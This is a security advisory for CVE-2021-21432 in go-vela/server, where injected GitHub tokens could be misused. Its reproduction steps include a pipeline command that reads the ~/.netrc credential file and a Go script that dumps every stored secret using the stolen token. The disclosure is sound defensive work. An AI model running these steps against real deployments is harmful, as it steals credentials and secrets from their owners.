# Reject unauthorized access with GitHub PATs

**GHSA**: GHSA-8j3f-mhq8-gmh4 | **CVE**: CVE-2021-21432 | **Severity**: high (CVSS 7.5)

**CWE**: CWE-285, CWE-862, CWE-863

**Affected Packages**:
- **github.com/go-vela/server** (go): >= 0.7.0, < 0.7.5

## Description

### Impact
_What kind of vulnerability is it? Who is impacted?_

The additional auth mechanism added within https://github.com/go-vela/server/pull/246 enables some malicious user to obtain secrets utilizing the injected credentials within the `~/.netrc` file. Steps to reproduce

1. Create Vela server
2. Login to Vela UI
3. Promote yourself to Vela administrator 
    - `UPDATE users SET admin = 't' WHERE name = <username>`
4. Activate repository within Vela
5. Add `.vela.yml` to the repository with the following content

    
    ```yaml
    version: "1"
    
    steps:
    - name: steal
      image: alpine
      commands:
        - cat ~/.netrc
    ```

1. Look at build logs to find the following content

    ```
    $ cat ~/.netrc
    machine <GITHUB URL>
    login x-oauth-basic
    password <token>
    ```

1. Copy the password to be utilized in some later step
1. Add secret(s) to activated repo
1. Copy the following script into `main.go`

    ```golang
    package main
    
    import (
	    "fmt"
	    "github.com/go-vela/sdk-go/vela"
	    "os"
    )
    
    func main() {
	    // create client to connect to vela
	    client, err := vela.NewClient(os.Getenv("VELA_SERVER_ADDR"), "vela", nil)
	    if err != nil {
		    panic(err)
	    }
    
	    // add PAT to request
	    client.Authentication.SetPersonalAccessTokenAuth(os.Getenv("VELA_TOKEN"))
    
    
	    secrets, _, err := client.Admin.Secret.GetAll(&vela.ListOptions{})
	    if err != nil {
		    panic(err)
	    }
    
	    for _, secret := range *secrets {
		    fmt.Println(*secret.Name)
		    fmt.Println(*secret.Value)
	    }
    }
    ```

1. Run the `main.go` with environment specific settings
   - `VELA_SERVER_ADDR=http://localhost:8080 VELA_TOKEN=<token obtained previously> go run main.go`

The previously posted script could be updated to utilize any API endpoint(s) the activated user has access against.

### Patches
_Has the problem been patched? What versions should users upgrade to?_

* Upgrade to `v0.7.5` or later

### Workarounds
_Is there a way for users to fix or remediate the vulnerability without upgrading?_

* No known workarounds

### References
_Are there any links users can visit to find out more?_

* https://github.com/go-vela/server/pull/246
* https://docs.github.com/en/enterprise-server@3.0/rest/reference/apps#check-a-token

### For more information
If you have any questions or comments about this advisory

* Email us at [vela@target.com](mailto:vela@target.com)
